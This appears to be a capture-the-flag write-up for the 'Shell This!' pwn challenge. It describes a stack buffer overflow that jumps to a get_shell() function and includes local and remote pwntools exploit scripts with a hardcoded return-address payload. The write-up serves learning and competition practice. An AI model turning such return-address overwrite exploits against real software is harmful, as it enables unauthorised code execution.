### Pwn
========================================================================================
#### Shell This!
-----------------------------------------------------------------------------------------
 points 100
 
#### Description
*Author : Faith
*Somebody told me that this program is vulnerable to something called remote code execution?*
*I'm not entirely sure what that is, but could you please figure it out for me?*

*nc chal.duc.tf 30002*

*Attached files:*

	• shellthis.c (sha256: 82c8a27640528e7dc0c907fcad549a3f184524e7da8911e5156b69432a8ee72c)
  
	• shellthis (sha256: af6d30df31f0093cce9a83ae7d414233624aa8cf23e0fd682edae057763ed2e8)
 
First ran file, strings to examine the binary. From the code we can deduce that we have to do a buffer overflow attack to  execute get_shell() function.

![image](https://user-images.githubusercontent.com/45536407/94332318-352abe80-ffa2-11ea-8a71-076689e58477.png)

Since we have the binary we can do the attack on local machine first and then replicate it on server.For finding the NOPs I used cyclic utility.

![image](https://user-images.githubusercontent.com/45536407/94332328-496ebb80-ffa2-11ea-88be-6cf210088d6b.png)

![image](https://user-images.githubusercontent.com/45536407/94332332-512e6000-ffa2-11ea-8052-60c6d583d935.png)

local exploit : 
exploit.py
```
from pwn import *                                                                                                                                                    
proc = process('/home/kaliuser/Downloads/ductf/shellthis')                                                                                                                                   
elf = ELF('/home/kaliuser/Downloads/ductf/shellthis')                                                                                                                                        
shell_func = elf.symbols.get_shell                                                                                                                                       
                                                                                                                                                                     
#### this adds value of shell_func after 56 chars ####################                                                                                               
payload = fit({56: shell_func}) 
print(payload)
                                                                                                                                                                     
proc.sendline(payload)                                                                                                                                               
proc.interactive()    
```

From here we got the address of the function get_shell and we can use same payload remotely.

exploit_remote.py
```
from pwn import *     
conn = remote('chal.duc.tf',30002)
print(conn.recvline())
print( conn.recv())

payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa\xca\x06\x40\x00\n'
conn.send(payload)
conn.interactive()
```

Running the exploit and getting the flag:

![image](https://user-images.githubusercontent.com/45536407/94332394-d9ad0080-ffa2-11ea-8d4a-dd85df42f4c4.png)
